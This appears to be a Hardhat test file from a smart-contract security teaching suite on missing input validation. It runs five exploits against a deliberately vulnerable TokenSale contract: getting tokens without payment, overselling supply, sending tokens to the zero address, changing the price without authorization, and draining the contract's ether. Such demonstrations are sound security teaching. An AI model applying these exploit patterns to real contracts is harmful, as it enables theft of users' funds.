const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("SC04: Lack of Input Validation - Token Sale Exploit", function () {
  let deployer, attacker, user;
  let vulnerableContract, exploiterContract;

  before(async function () {
    [deployer, attacker, user] = await ethers.getSigners();

    // Deploy the vulnerable TokenSale contract
    const TokenSale = await ethers.getContractFactory("TokenSale", deployer);
    vulnerableContract = await TokenSale.deploy();
    
    console.log("\n[Setup] Vulnerable TokenSale contract deployed");
    console.log(`Token Price: ${ethers.formatEther(await vulnerableContract.tokenPrice())} ETH`);
    console.log(`Total Supply: ${await vulnerableContract.totalSupply()} tokens`);
  });

  it("should allow attacker to purchase tokens without sending ETH", async function () {
    // Deploy the exploiter contract
    const InputValidationExploiter = await ethers.getContractFactory("InputValidationExploiter", attacker);
    const vulnerableContractAddress = await vulnerableContract.getAddress();
    exploiterContract = await InputValidationExploiter.deploy(vulnerableContractAddress);
    
    console.log("\n[Attack 1] Purchasing tokens without payment...");
    
    // Check initial state
    const initialBalance = await vulnerableContract.balances(await exploiterContract.getAddress());
    console.log(`Attacker's initial token balance: ${initialBalance}`);
    
    // Execute attack - purchase 10 tokens without sending any ETH
    await exploiterContract.connect(attacker).attackPurchaseWithoutPayment(10);
    
    // Check final state
    const finalBalance = await vulnerableContract.balances(await exploiterContract.getAddress());
    console.log(`Attacker's final token balance: ${finalBalance}`);
    
    // Verify the attack succeeded
    expect(finalBalance).to.equal(10);
    console.log("✓ Attack successful: Attacker obtained tokens without payment!");
  });

  it("should allow attacker to exceed token supply", async function () {
    console.log("\n[Attack 2] Purchasing tokens exceeding total supply...");
    
    const totalSupply = await vulnerableContract.totalSupply();
    const soldTokens = await vulnerableContract.soldTokens();
    console.log(`Total Supply: ${totalSupply}`);
    console.log(`Already Sold: ${soldTokens}`);
    
    // Try to purchase more than total supply
    const excessAmount = Number(totalSupply) + 1000;
    await exploiterContract.connect(attacker).attackExceedSupply(excessAmount);
    
    const newSoldTokens = await vulnerableContract.soldTokens();
    console.log(`New Sold Tokens: ${newSoldTokens}`);
    
    // Verify the attack succeeded (sold tokens exceed total supply)
    expect(newSoldTokens).to.be.greaterThan(totalSupply);
    console.log("✓ Attack successful: Sold tokens exceed total supply!");
  });

  it("should allow attacker to transfer tokens to zero address", async function () {
    console.log("\n[Attack 3] Transferring tokens to zero address...");
    
    // First, give the exploiter some tokens
    await vulnerableContract.connect(user).purchaseTokens(50, { value: ethers.parseEther("50") });
    await vulnerableContract.connect(user).transfer(await exploiterContract.getAddress(), 20);
    
    const balanceBefore = await vulnerableContract.balances(await exploiterContract.getAddress());
    console.log(`Attacker's token balance before: ${balanceBefore}`);
    
    // Attack: Transfer to zero address
    await exploiterContract.connect(attacker).attackTransferToZero(10);
    
    const balanceAfter = await vulnerableContract.balances(await exploiterContract.getAddress());
    const zeroAddressBalance = await vulnerableContract.balances(ethers.ZeroAddress);
    
    console.log(`Attacker's token balance after: ${balanceAfter}`);
    console.log(`Zero address balance: ${zeroAddressBalance}`);
    
    // Verify tokens were transferred to zero address
    expect(zeroAddressBalance).to.equal(10);
    console.log("✓ Attack successful: Tokens sent to zero address (effectively burned)!");
  });

  it("should allow attacker to change token price without being owner", async function () {
    console.log("\n[Attack 4] Changing token price without authorization...");
    
    const oldPrice = await vulnerableContract.tokenPrice();
    console.log(`Old token price: ${ethers.formatEther(oldPrice)} ETH`);
    
    // Attack: Change price to 0.001 ETH
    const newPrice = ethers.parseEther("0.001");
    await exploiterContract.connect(attacker).attackChangePrice(newPrice);
    
    const currentPrice = await vulnerableContract.tokenPrice();
    console.log(`New token price: ${ethers.formatEther(currentPrice)} ETH`);
    
    // Verify the attack succeeded
    expect(currentPrice).to.equal(newPrice);
    console.log("✓ Attack successful: Token price changed without authorization!");
  });

  it("should allow attacker to withdraw funds without being owner", async function () {
    console.log("\n[Attack 5] Withdrawing funds without authorization...");
    
    const contractBalance = await vulnerableContract.getBalance();
    console.log(`Contract balance before: ${ethers.formatEther(contractBalance)} ETH`);
    
    const attackerBalanceBefore = await ethers.provider.getBalance(await exploiterContract.getAddress());
    console.log(`Attacker balance before: ${ethers.formatEther(attackerBalanceBefore)} ETH`);
    
    // Attack: Withdraw all funds
    await exploiterContract.connect(attacker).attackWithdraw();
    
    const contractBalanceAfter = await vulnerableContract.getBalance();
    const attackerBalanceAfter = await ethers.provider.getBalance(await exploiterContract.getAddress());
    
    console.log(`Contract balance after: ${ethers.formatEther(contractBalanceAfter)} ETH`);
    console.log(`Attacker balance after: ${ethers.formatEther(attackerBalanceAfter)} ETH`);
    
    // Verify the attack succeeded
    expect(contractBalanceAfter).to.equal(0);
    expect(attackerBalanceAfter).to.be.greaterThan(attackerBalanceBefore);
    console.log("✓ Attack successful: Funds withdrawn without authorization!");
  });
});
